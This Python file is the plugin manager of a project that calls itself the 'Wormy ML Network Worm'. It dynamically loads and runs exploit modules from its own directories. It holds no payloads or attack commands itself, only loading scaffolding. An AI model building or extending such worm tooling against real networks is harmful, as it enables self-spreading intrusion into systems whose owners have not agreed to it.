"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Plugin System
Dynamic loading and management of exploit modules
"""

import importlib
import importlib.util
import inspect
import os
import sys
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Type

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


@dataclass
class PluginInfo:
    """Plugin metadata"""

    name: str
    module: str
    class_name: str
    description: str
    version: str = "1.0.0"
    author: str = "Ruby570bocadito"
    category: str = "exploit"
    enabled: bool = True
    config: Dict[str, Any] = field(default_factory=dict)


class PluginManager:
    """
    Plugin System for Wormy

    Features:
    - Dynamic plugin loading from directories
    - Plugin metadata and versioning
    - Enable/disable plugins at runtime
    - Plugin configuration
    - Hot-reload support
    """

    def __init__(self):
        self.plugins: Dict[str, PluginInfo] = {}
        self.instances: Dict[str, Any] = {}
        self.plugin_dirs = [
            os.path.join(
                os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "exploits", "modules"
            ),
            os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "plugins"),
        ]

    def discover_plugins(self) -> List[PluginInfo]:
        """Discover all available plugins"""
        discovered = []

        for plugin_dir in self.plugin_dirs:
            if not os.path.exists(plugin_dir):
                continue

            for filename in os.listdir(plugin_dir):
                if not filename.endswith(".py") or filename.startswith("_"):
                    continue

                module_name = filename[:-3]
                module_path = os.path.join(plugin_dir, filename)

                try:
                    spec = importlib.util.spec_from_file_location(module_name, module_path)
                    if spec and spec.loader:
                        module = importlib.util.module_from_spec(spec)
                        spec.loader.exec_module(module)

                        # Find classes that inherit from BaseExploit or are plugins
                        for name, obj in inspect.getmembers(module, inspect.isclass):
                            if name.endswith("_Exploit") or hasattr(obj, "check_vulnerable"):
                                plugin = PluginInfo(
                                    name=name,
                                    module=module_name,
                                    class_name=name,
                                    description=obj.__doc__ or name,
                                    category="exploit",
                                )
                                discovered.append(plugin)
                                self.plugins[name] = plugin

                except Exception as e:
                    logger.debug(f"Failed to load plugin {module_name}: {e}")

        logger.info(f"Discovered {len(discovered)} plugins")
        return discovered

    def load_plugin(self, plugin_name: str, **kwargs) -> Optional[Any]:
        """Load and instantiate a plugin"""
        if plugin_name not in self.plugins:
            logger.error(f"Plugin not found: {plugin_name}")
            return None

        plugin = self.plugins[plugin_name]
        if not plugin.enabled:
            logger.warning(f"Plugin disabled: {plugin_name}")
            return None

        try:
            module = importlib.import_module(f"exploits.modules.{plugin.module}")
            cls = getattr(module, plugin.class_name)
            instance = cls(**kwargs)
            self.instances[plugin_name] = instance
            logger.info(f"Plugin loaded: {plugin_name}")
            return instance
        except Exception as e:
            logger.error(f"Failed to load plugin {plugin_name}: {e}")
            return None

    def enable_plugin(self, plugin_name: str):
        """Enable a plugin"""
        if plugin_name in self.plugins:
            self.plugins[plugin_name].enabled = True
            logger.info(f"Plugin enabled: {plugin_name}")

    def disable_plugin(self, plugin_name: str):
        """Disable a plugin"""
        if plugin_name in self.plugins:
            self.plugins[plugin_name].enabled = False
            if plugin_name in self.instances:
                del self.instances[plugin_name]
            logger.info(f"Plugin disabled: {plugin_name}")

    def get_enabled_plugins(self) -> List[PluginInfo]:
        """Get all enabled plugins"""
        return [p for p in self.plugins.values() if p.enabled]

    def get_plugin_stats(self) -> Dict:
        """Get plugin statistics"""
        return {
            "total": len(self.plugins),
            "enabled": len(self.get_enabled_plugins()),
            "disabled": len([p for p in self.plugins.values() if not p.enabled]),
            "loaded": len(self.instances),
        }
